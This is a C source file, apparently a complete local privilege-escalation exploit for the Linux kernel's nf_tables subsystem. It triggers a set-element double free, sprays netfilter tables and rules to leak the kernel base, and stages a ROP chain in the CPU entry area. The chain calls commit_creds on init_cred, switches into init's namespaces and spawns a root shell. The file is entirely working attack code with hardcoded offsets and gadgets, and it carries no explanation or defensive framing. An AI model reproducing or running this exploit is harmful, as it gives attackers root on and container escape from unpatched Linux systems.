#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sched.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <err.h>
#include <errno.h>
#include <net/if.h>
#include <sys/wait.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/set.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>

uint64_t find_task_by_vpid_off = 0x1c1830;
uint64_t switch_task_namespaces_off = 0x1c93f0;
uint64_t commit_creds_off = 0x1cafa0;
uint64_t init_nsproxy_off = 0x2676880;
uint64_t init_cred_off = 0x2676ac0;
uint64_t swapgs_restore_regs_and_return_to_usermode_off = 0x1201146;
uint64_t nft_counter_ops_off = 0x1b2d6e0;

// 0xffffffff82041249 : push rbx ; and byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; jmp 0xffffffff82404d40
// 0xffffffff81088a8c : pop rdi ; jmp 0xffffffff82404d40
// 0xffffffff810e8a9f : pop rsi ; jmp 0xffffffff82404d40
// 0xffffffff821cfbdb : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; jmp 0xffffffff82404d40

uint64_t push_rbx_pop_rsp = 0x1041249;
uint64_t pop_rdi_ret = 0x088a8c;
uint64_t pop_rsi_ret = 0x0e8a9f;
uint64_t mov_rdi_rax_ret = 0x11cfbdb;

uint64_t kbase = 0;

struct mnl_socket * nl;
uint32_t portid;

// CPU entry area pointers. We prepare some memory here that will be referenced
// by the ROP chains.
// We need:
//  - the struct nft_expr_ops { .eval } member
#define CPU_ENTRY_AREA_BASE(cpu) (0xfffffe0000001000ull + (uint64_t)cpu * 0x3b000)
#define PAYLOAD_LOCATION(cpu) (CPU_ENTRY_AREA_BASE(cpu) + 0x1f58 )

struct cpu_entry_area_payload {
    uint64_t regs[16];
};

static void sig_handler(int s) {}

static __attribute__((noreturn)) void write_cpu_entry_area(void* payload) {
  asm volatile (
	  "mov %0, %%rsp\n"
	  "pop %%r15\n"
	  "pop %%r14\n"
	  "pop %%r13\n"
	  "pop %%r12\n"
	  "pop %%rbp\n"
	  "pop %%rbx\n"
	  "pop %%r11\n"
	  "pop %%r10\n"
	  "pop %%r9\n"
	  "pop %%r8\n"
	  "pop %%rax\n"
	  "pop %%rcx\n"
	  "pop %%rdx\n"
	  "pop %%rsi\n"
	  "pop %%rdi\n"
	  "divq (0x1234000)\n"
    "1:\n"
    "jmp 1b\n"
    : : "r"(payload)
  );
  __builtin_unreachable();
}

// Fill the CPU entry area exception stack of HELPER_CPU with a
// struct cpu_entry_area_payload
static void setup_cpu_entry_area() {
  if (fork()) {
    return;
  }

  struct cpu_entry_area_payload payload = {};
  payload.regs[5] = kbase + push_rbx_pop_rsp;

    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(1, &my_set);

    if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
        perror("[-] sched_setaffinity()");
        exit(EXIT_FAILURE);
    }

  signal(SIGFPE, sig_handler);
  signal(SIGTRAP, sig_handler);
  signal(SIGSEGV, sig_handler);
  setsid();

  write_cpu_entry_area(&payload);
}

void write_file(const char *filename, char *text) {
    int fd = open(filename, O_RDWR | O_CREAT, 0600);

    write(fd, text, strlen(text));
    close(fd);
}

void new_ns(void) {
    uid_t uid = getuid();
    gid_t gid = getgid();
    char buffer[0x100];

    unshare(CLONE_NEWUSER | CLONE_NEWNS);

    unshare(CLONE_NEWNET);

    write_file("/proc/self/setgroups", "deny");

    snprintf(buffer, sizeof(buffer), "0 %d 1", uid);
    write_file("/proc/self/uid_map", buffer);
    snprintf(buffer, sizeof(buffer), "0 %d 1", gid);
    write_file("/proc/self/gid_map", buffer);
}

void pwn(){
    setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
    setns(open("/proc/1/ns/pid", O_RDONLY), 0);
    setns(open("/proc/1/ns/net", O_RDONLY), 0);

    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);

    exit(0);
}

uint64_t _user_rip = (uint64_t) pwn;
uint64_t _user_cs = 0;
uint64_t _user_rflags = 0;
uint64_t _user_sp = 0;
uint64_t _user_ss = 0;

void save_state(void) {
	__asm__(".intel_syntax noprefix;"
	"mov _user_cs, cs;"
	"mov _user_ss, ss;"
	"mov _user_sp, rsp;"
	"pushf;"
	"pop _user_rflags;"
	".att_syntax");
	return;
}

char * table1_name = "table1";
char * set1_name = "set1";
char * chain1_name = "chain1";

void make_payload(uint64_t* data){
    int i = 0;

    // commit_creds(&init_cred)
    data[i++] = kbase + pop_rdi_ret;
    data[i++] = kbase + init_cred_off;
    data[i++] = kbase + commit_creds_off;

    // find_task_by_vpid(1)
    data[i++] = kbase + pop_rdi_ret;
    data[i++] = 1;
    data[i++] = kbase + find_task_by_vpid_off;

    data[i++] = kbase + pop_rsi_ret;
    data[i++] = 0;

    // switch_task_namespaces(find_task_by_vpid(1), &init_nsproxy)
    data[i++] = kbase + mov_rdi_rax_ret;
    data[i++] = kbase + pop_rsi_ret;
    data[i++] = kbase + init_nsproxy_off;
    data[i++] = kbase + switch_task_namespaces_off;

    data[i++] = kbase + swapgs_restore_regs_and_return_to_usermode_off;
    data[i++] = 0;
    data[i++] = 0;
    data[i++] = _user_rip;
    data[i++] = _user_cs;
    data[i++] = _user_rflags;
    data[i++] = _user_sp;
    data[i++] = _user_ss;
}

#define TABLE_SPRAY     0x80

void trig(){
    struct nftnl_table * table = nftnl_table_alloc();
    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table1_name);
    nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);

    struct nftnl_chain * chain1 = nftnl_chain_alloc();
    nftnl_chain_set_str(chain1, NFTNL_CHAIN_TABLE, table1_name);
    nftnl_chain_set_str(chain1, NFTNL_CHAIN_NAME, chain1_name);
    nftnl_chain_set_u32(chain1, NFTNL_CHAIN_FLAGS, 0);

    #define desc_count 2

    uint8_t desc_concat[desc_count];
    desc_concat[0] = 1;
    desc_concat[1] = 1;

    uint32_t n_elements = 0x100;

    #define key_size 8

    struct nftnl_set * set_trigger =  nftnl_set_alloc();

    nftnl_set_set_str(set_trigger, NFTNL_SET_TABLE, table1_name);
    nftnl_set_set_str(set_trigger, NFTNL_SET_NAME, set1_name);
    nftnl_set_set_u32(set_trigger, NFTNL_SET_FLAGS, NFT_SET_INTERVAL | NFT_SET_CONCAT | NFT_SET_TIMEOUT);
    nftnl_set_set_u32(set_trigger, NFTNL_SET_KEY_LEN, key_size);
    nftnl_set_set_u32(set_trigger, NFTNL_SET_ID, 1337);
    nftnl_set_set_u32(set_trigger, NFTNL_SET_DESC_SIZE, n_elements);
    nftnl_set_set_data(set_trigger, NFTNL_SET_DESC_CONCAT, desc_concat, desc_count);

    struct nftnl_set * set_elem_trigger =  nftnl_set_alloc();

    nftnl_set_set_str(set_elem_trigger, NFTNL_SET_TABLE, table1_name);
    nftnl_set_set_str(set_elem_trigger, NFTNL_SET_NAME, set1_name);

    #define data_size 192

    unsigned long key_data[key_size] = {0,};
    unsigned long user_data[data_size] = {0,};

    struct nftnl_set_elem * elem1 = nftnl_set_elem_alloc();

    nftnl_set_elem_set(elem1, NFTNL_SET_ELEM_KEY, &key_data, key_size);
    nftnl_set_elem_set(elem1, NFTNL_SET_ELEM_USERDATA, &user_data, data_size);
    nftnl_set_elem_set_u64(elem1, NFTNL_SET_ELEM_TIMEOUT, 1);

    nftnl_set_elem_add(set_elem_trigger, elem1);

    size_t buf_size = MNL_SOCKET_BUFFER_SIZE * 100;
    char *buf = malloc(buf_size);

    struct mnl_nlmsg_batch * batch;
    int seq = 0;
    struct nlmsghdr * nlh;

    // setup table, chain
    batch = mnl_nlmsg_batch_start(buf, buf_size);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, NFPROTO_IPV4, NLM_F_CREATE, seq++);
    nftnl_table_nlmsg_build_payload(nlh, table);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWCHAIN, NFPROTO_IPV4, NLM_F_CREATE, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, chain1);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    // trigger vuln
    batch = mnl_nlmsg_batch_start(buf, buf_size);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWSET, NFPROTO_IPV4, NLM_F_CREATE, seq++);
    nftnl_set_nlmsg_build_payload(nlh, set_trigger);
    mnl_nlmsg_batch_next(batch);

    for(int i = 0; i < n_elements; i++){
        nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWSETELEM, NFPROTO_IPV4, NLM_F_CREATE, seq++);
        nftnl_set_elems_nlmsg_build_payload(nlh, set_elem_trigger);
        mnl_nlmsg_batch_next(batch);
    }

    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELSETELEM, NFPROTO_IPV4, 0, seq++);
    nftnl_set_elems_nlmsg_build_payload(nlh, set_elem_trigger);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    // wait for destroy work
    usleep(500*1000);

    // spray tables
    #define table_spray_size 256
    char table_data[table_spray_size] = {0,};

    struct nftnl_table * tables[TABLE_SPRAY] = {0,};

    for(int i = 0; i < TABLE_SPRAY; i++){
        char *table_name;
        asprintf(&table_name, "st256_%02hx", i);

        struct nftnl_table * table = nftnl_table_alloc();
        nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);
        nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);
        nftnl_table_set_data(table, NFTNL_TABLE_USERDATA, table_data, table_spray_size);

        tables[i] = table;
    }

    for(int i = 0; i < TABLE_SPRAY; i++){
        batch = mnl_nlmsg_batch_start(buf, buf_size);
        nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, NFPROTO_IPV4, 0, seq++);
        nftnl_table_nlmsg_build_payload(nlh, tables[i]);
        mnl_nlmsg_batch_next(batch);

        nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
            err(1, "mnl_socket_send");
        }
    }

    // del set
    batch = mnl_nlmsg_batch_start(buf, buf_size);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELSET, NFPROTO_IPV4, 0, seq++);
    nftnl_set_nlmsg_build_payload(nlh, set_trigger);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    // wait for double free
    usleep(500*1000);

    // spray rules for leak
    #define rule_spray_size 256-25-16

    char rule_data[rule_spray_size] = {0x0,};

    struct nftnl_rule * rule_spray = nftnl_rule_alloc();

    nftnl_rule_set_str(rule_spray, NFTNL_RULE_TABLE, table1_name);
    nftnl_rule_set_str(rule_spray, NFTNL_RULE_CHAIN, chain1_name);
    nftnl_rule_set_data(rule_spray, NFTNL_RULE_USERDATA, rule_data, rule_spray_size);

    struct nftnl_expr *expr = nftnl_expr_alloc("counter");
    nftnl_rule_add_expr(rule_spray, expr);

    batch = mnl_nlmsg_batch_start(buf, buf_size);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    #define RULE_SPRAY 256
    for(int i = 0; i < RULE_SPRAY; i++){
        nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, NFPROTO_IPV4, NLM_F_CREATE, seq++);
        nftnl_rule_nlmsg_build_payload(nlh, rule_spray);
        mnl_nlmsg_batch_next(batch);
    }

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    // get table
    for(int i = 0; i < TABLE_SPRAY; i++){
        char *table_name;
        asprintf(&table_name, "st256_%02hx", i);

        #define READ_SIZE 0x400

        char read_data[READ_SIZE] = {0,};
        memset(read_data, 0, READ_SIZE);

        struct nftnl_table *table_get = nftnl_table_alloc();
        nftnl_table_set_str(table_get, NFTNL_TABLE_NAME, table_name);

        nlh = nftnl_table_nlmsg_build_hdr(buf, NFT_MSG_GETTABLE, NFPROTO_IPV4, NLM_F_ACK, seq);
        nftnl_table_nlmsg_build_payload(nlh, table_get);
        nftnl_table_free(table_get);

        if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
            err(1, "mnl_socket_send");
        }

        int ret;

        ret = mnl_socket_recvfrom(nl, read_data, READ_SIZE);

        #define LEAK_OFF 0x5c

        if (ret > 0) {
            if(read_data[LEAK_OFF] != '\0'){
                kbase = *(unsigned long*)&read_data[LEAK_OFF] - nft_counter_ops_off;

                printf("[*] kbase %lx\n", kbase);
                break;
            }
            ret = mnl_socket_recvfrom(nl, read_data, READ_SIZE);
        }
    }

    if(kbase == 0) return;

    setup_cpu_entry_area();

    // del table
    for(int i = 0; i < TABLE_SPRAY; i++){
        batch = mnl_nlmsg_batch_start(buf, buf_size);
        nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELTABLE, NFPROTO_IPV4, 0, seq++);
        nftnl_table_nlmsg_build_payload(nlh, tables[i]);
        mnl_nlmsg_batch_next(batch);

        nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
            err(1, "mnl_socket_send");
        }
    }

    // wait for destroy work
    usleep(500*1000);

    // spray fake rule
    memset(table_data, 0, table_spray_size);

    uint64_t fake_rule_handle = 0xffff;
    uint64_t dlen = 0x8;

    // nft_rule.handle
    *(uint64_t*)&table_data[0x10] = (dlen << 44) | fake_rule_handle;
    // nft_rule.handle.nft_expr[0].ops
    *(uint64_t*)&table_data[0x18] = PAYLOAD_LOCATION(1);

    make_payload((uint64_t*)(table_data+0x20));

    for(int i = 0; i < TABLE_SPRAY; i++){
        char *table_name;
        asprintf(&table_name, "st256_%02hx", i);

        struct nftnl_table * table = nftnl_table_alloc();
        nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);
        nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);
        nftnl_table_set_data(table, NFTNL_TABLE_USERDATA, table_data, table_spray_size);

        tables[i] = table;
    }

    for(int i = 0; i < TABLE_SPRAY; i++){
        batch = mnl_nlmsg_batch_start(buf, buf_size);
        nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, NFPROTO_IPV4, 0, seq++);
        nftnl_table_nlmsg_build_payload(nlh, tables[i]);
        mnl_nlmsg_batch_next(batch);

        nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
            err(1, "mnl_socket_send");
        }
    }

    // del fake rule
    struct nftnl_rule * rule_del = nftnl_rule_alloc();

    nftnl_rule_set_str(rule_del, NFTNL_RULE_TABLE, table1_name);
    nftnl_rule_set_str(rule_del, NFTNL_RULE_CHAIN, chain1_name);
    nftnl_rule_set_u64(rule_del, NFTNL_RULE_HANDLE, fake_rule_handle);

    batch = mnl_nlmsg_batch_start(buf, buf_size);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELRULE, NFPROTO_IPV4, 0, seq++);
    nftnl_rule_nlmsg_build_payload(nlh, rule_del);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }
}

void netfilter(){
    save_state();

    while(1){
        new_ns();

        nl = mnl_socket_open(NETLINK_NETFILTER);
        if (nl == NULL) {
            err(1, "mnl_socket_open");
        }

        trig();
    }
}

int main(int argc, char ** argv)
{
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(0, &my_set);

    if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
        perror("[-] sched_setaffinity()");
        exit(EXIT_FAILURE);
    }

    netfilter();

    return 0;
}